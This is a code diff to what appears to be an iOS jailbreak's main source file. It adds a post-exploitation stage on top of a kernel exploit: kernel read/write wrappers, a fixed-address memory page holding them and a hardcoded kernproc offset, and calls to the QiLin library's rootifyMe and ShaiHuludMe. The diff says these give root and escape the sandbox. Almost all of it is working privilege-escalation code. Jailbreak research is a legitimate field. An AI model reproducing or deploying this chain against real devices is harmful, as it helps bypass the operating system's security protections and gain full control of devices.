@@ -9,9 +9,10 @@
 #include "jailbreak.h"
 #include "extra_recipe_utils.h"
 #include "multipath_kfree.h"
+#include "QiLin.h"
 
 #include <sys/socket.h>
-
+#include <sys/mman.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -60,13 +61,51 @@ static int _is_port_corrupt(mach_port_t port)
     return 0;
 }
 
-void post_exploitation(uint64_t kaslr_shift)
+
+static int __readKernelMemory(uint64_t Address, uint64_t Len, void **To)
+{
+    void *mem = malloc(Len);
+    kread(Address, mem, (int)Len);
+    *To = mem;
+    
+    return (int)Len;
+}
+
+static int __writeKernelMemory(uint64_t Address, uint64_t Len, void *From)
+{
+    kwrite(Address, From, (int)Len);
+    
+    return (int)Len;
+}
+
+// This will not enable all QiLin features - but enough for us
+void _init_tfp0less_qilin(uint64_t kaslr_shift)
+{
+    uint64_t kernproc = 0xfffffff0076450a8 + kaslr_shift;
+    uint64_t *m = (uint64_t *)mmap((void *)0x110000000, 0x4000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    
+    *m = (uint64_t)__readKernelMemory;
+    *(m + 1) = (uint64_t)__writeKernelMemory;
+    *(m + 2) = kernproc;
+}
+
+void post_exploitation(uint64_t kernel_base, uint64_t kaslr_shift)
 {
     // Do Electra/QiLin/Saurik/etc stuff here
     
-    printf("Post-exploitation stage, you have kernel RWX with a clear API now (extra_recipe_utils.h) so put whatever you want here (let me spell it out for you Reddit: this === tfp0). There is no more exploitation of any vulnerabilities to be done, only mitigation bypasses of which all are public. I called this a PoC because of lack of offsets, elegant techniques, testing, reliability, documentation and so on, not because it does nothing\n");
+    printf("Post-exploitation stage, you have kernel RWX with a clear API now (extra_recipe_utils.h) so put whatever you want here (let me spell it out for you Reddit: this === tfp0). There is no more exploitation of any vulnerabilities to be done, only mitigation bypasses of which all are public. I called this a PoC because of lack of offsets, elegant techniques, testing, reliability, documentation and so on, not because it does nothing");
     
-    // kx3(0xffffffff41414141, 0x1111, 0x2222, 0x3333);
+    // kwx3(0xFFFFFFFF41414141, 0x111, 0x222, 0x333); // How to use API
+    
+    // Use Jonathan Levin's QiLin to elevate prvileges and escape sandbox.
+    
+    _init_tfp0less_qilin(kaslr_shift);
+    initQiLin(0x1337, kernel_base);
+    
+    rootifyMe();
+    ShaiHuludMe(0);
+    
+    printf("If all went well, sandbox escaped and root achieved now, test it if you want\n");
 }
 
 void jb_go(void)
@@ -181,7 +220,7 @@ void jb_go(void)
     
     printf("kernelbase DWORD: %08X\n", val);
     
-    post_exploitation(kaslr_shift);
+    post_exploitation(kernel_base, kaslr_shift);
     
     printf("Done\n");
     for (;;)
